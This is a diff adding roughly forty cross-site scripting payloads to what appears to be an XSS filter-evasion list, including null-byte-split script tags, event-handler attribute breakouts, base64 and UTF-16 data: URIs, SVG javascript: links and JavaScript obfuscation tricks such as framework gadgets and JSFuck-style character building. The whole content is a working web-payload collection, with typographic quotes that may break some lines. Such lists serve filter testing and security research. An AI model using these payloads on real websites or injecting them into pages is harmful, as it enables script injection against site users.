@@ -27,6 +27,52 @@ V
 <IMG SRC=javascript:alert(‘XSS’)>      
 <img src=xss onerror=alert(1)>
 
+%00<script>alert(1);</script>
+<%00s%00c%00r%00i%00p%00t%00>alert(1);</%00s%00c%00r%00i%00p%00t%00>
+a%20onchange=alert(9)>
+“onmouseover=alert(9)//“>
+‘onclick=alert(9)//‘>
+“autofocus/onfocus=alert(9)//“>
+<a href=”data:text/html;base64,PHNjcmlwdD5hbGVydCg5KTwvc2NyaXB0Pg”>foo</a>
+<a href=”data:text/html;charset=utf16,%ff%fe%3c%00s%00c%00r%00i%00p%00t%00%3e%00a%00l%00e%00r%00t%00(%009%00)%00<%00/%00s%00c%00r%00i%00p%00t%00>%00″>foo</a>
+<svg xmlns=”http://www.w3.org/2000/svg”><a xmlns:xlink=”http://www.w3.org/1999/xlink” xlink:href=”javascript:alert(9)”><rect width=”1000″ height=”1000″ fill=”white”/></a></svg>
+<a href=””&<img&amp;/onclick=alert(9)>foo</a>
+<a””id=a href=”onclick=alert(9)>foo</a>
+<a href=””&amp;/onclick=alert(9)>foo</a>
+<img src=”>”onerror=alert(9)>
+<img id=”><“class=”><“src=”>”onerror=alert(9)>
+<img src=”\”a=”>”onerror=alert(9)>
+<a id=’ href=””>’href=javascript:alert(9)>foo</a>
+<a id=’href=http://web.site/’onclick=alert(9)>foo</a>
+<a href= . ‘”\’ onclick=alert(9) ‘”‘>foo</a>
+<img src=”\”‘<a href='”>”‘onerror=alert(9)>
+<a id=’http://web.site/’onclick=alert(9)<!–href=a>foo</a>–>
+<img src=”‘”id='<img src=””>’onerror=alert(9)>
+<img src=”<img src='<img src=.>’>”onerror=alert(9)>
+<a href=javascript:alert(9) href href=” href=””>foo</a>
+var a = “foo“+alert(9)//“;
+var a = “foo“&&alert(9)//“;
+var a = “foo“/alert(9)//“;
+(function(){alert(9)})()
+window[“alert”](9)
+String.fromCharCode(0x61,0x62)
+alert(/foo bar/.source)
+window[/alert/.source](9)
+angular.bind(self, alert, 9)()
+angular.element.apply(alert(9))
+Ember.run(null, alert, 9)
+_.defer(alert, 9)
+_.delay(alert, 0, 9)
+_.once(alert(9))
+false + “” = “false”
+![] + []
+( false + “” )[1] = “a”
+(window[“alert”])(9)
+(window[(![]+[])[1] + (![]+[])[2] + (![]+[])[4] +
+(!![]+[])[1] + (!![]+[])[0]])(9)
+
+
+
 
 <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
 
